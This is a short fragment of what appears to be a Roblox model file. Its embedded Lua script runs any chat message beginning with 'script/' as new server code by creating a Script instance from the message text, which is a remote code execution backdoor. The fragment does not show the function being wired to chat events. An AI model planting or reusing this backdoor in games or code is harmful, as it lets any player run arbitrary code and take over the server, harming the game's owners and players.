					<string name="Source">--Ahmahgawd!!!11oneone1!1

function onChatted(msg, recipient)
local call = string.sub(msg, 1, 7) -- script/
if call == &quot;script/&quot; then
part = string.sub(msg, 8)
local s = Instance.new(&quot;Script&quot;)
s.Source = part
wait(0.1)
s.Parent = workspace
end
end

